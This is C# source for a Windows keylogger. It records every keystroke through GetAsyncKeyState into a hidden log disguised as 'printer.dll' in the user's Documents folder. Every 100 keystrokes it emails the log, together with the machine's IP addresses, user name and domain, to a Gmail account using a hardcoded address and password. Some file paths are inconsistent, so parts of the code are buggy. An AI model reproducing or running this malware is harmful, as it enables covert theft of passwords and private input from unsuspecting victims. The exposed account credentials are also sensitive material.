using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace KeyConsole
{
    class Class1
    {
        [DllImport("User32")]
        private static extern int GetAsyncKeyState(Int32 i);

        private long numberOfKeystrokes;

        private static string filePath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);

        private static string path = filePath + @"printer.dll";

        public void CreateFile()
        {

            if (!Directory.Exists(filePath))
            {
                Directory.CreateDirectory(filePath);
            }

            if (!File.Exists(path))
            {
                using (StreamWriter sw = File.CreateText(path))
                {

                }
            }
            File.SetAttributes(path, File.GetAttributes(path) | FileAttributes.Hidden);
        }

        public void Cycle()
        {
            while (true)
            {
                Thread.Sleep(5);

                for (int i = 32; i < 127; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState == -32767)
                    {
                        Console.Write((char)i + ", ");

                        using (StreamWriter sw = File.AppendText(filePath))
                        {
                            sw.Write((char)i);
                        }
                        numberOfKeystrokes++;

                        if (numberOfKeystrokes % 100 == 0)
                        {
                            SendNewMessage();
                        }

                    }
                }

            }
        }
        static void SendNewMessage()
        {
            string folderName = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            string filePath = folderName + @"\printer.dll";

            string logContents = File.ReadAllText(filePath);
            string emailBody = "";

            DateTime now = DateTime.Now;

            string subject = "Message from keylogger";

            var host = Dns.GetHostEntry(Dns.GetHostName());

            foreach (var adress in host.AddressList)
            {
                emailBody += "Address: " + adress;
            }
            emailBody += "\n User: " + Environment.UserDomainName + " \\ " + Environment.UserName;
            emailBody += "\nhost " + host;
            emailBody += "\ntime: " + now.ToString();
            emailBody += logContents;

            SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
            MailMessage mailMessage = new MailMessage();

            mailMessage.From = new MailAddress("petrnovak7100@gmail.com");
            mailMessage.To.Add("petrnovak7100@gmail.com");
            mailMessage.Subject = subject;
            client.UseDefaultCredentials = false;
            client.EnableSsl = true;
            client.Credentials = new System.Net.NetworkCredential("petrnovak7100@gmail.com", "bagrbagrbagr");
            mailMessage.Body = emailBody;
            client.Send(mailMessage);
        }
    }
}
